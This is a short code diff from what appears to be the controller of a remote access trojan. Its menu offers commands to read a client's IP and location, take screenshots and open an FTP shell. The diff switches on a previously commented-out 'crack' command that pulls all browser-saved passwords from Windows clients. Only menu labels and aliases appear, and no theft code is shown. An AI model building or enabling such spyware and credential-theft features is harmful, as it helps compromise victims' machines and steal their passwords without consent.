@@ -18,7 +18,7 @@ class Menu:
                 "ip": Command("Get the **public IP** address of the client", (216, 25, 218), ["ipconfig", "ipinfo", "viewip", "showip"]),
                 "info": Command("Get all **information** about the client", (227, 222, 15), ["geolocate", "geolocation", "infomenu"]),
                 "screen": Command("Get a **screenshot** of the clients screen", (34, 116, 214), ["view", "ss", "screenshare", "screenshot"]),
-                #"crack": Command("Get all **browser saved passwords** from client\n> Works ONLY on Windows (client)", (224, 27, 27), ["hack", "passwords", "passwordlist"]),
+                "crack": Command("Get all **browser saved passwords** from client\n> Works ONLY on Windows (client)", (224, 27, 27), ["hack", "passwords", "passwordlist"]),
                 "ftp": Command("Get an **FTP+ shell** from the client", (15, 227, 143), ["ftp+", "ftpshell", "shellftp"])
             }
         else:
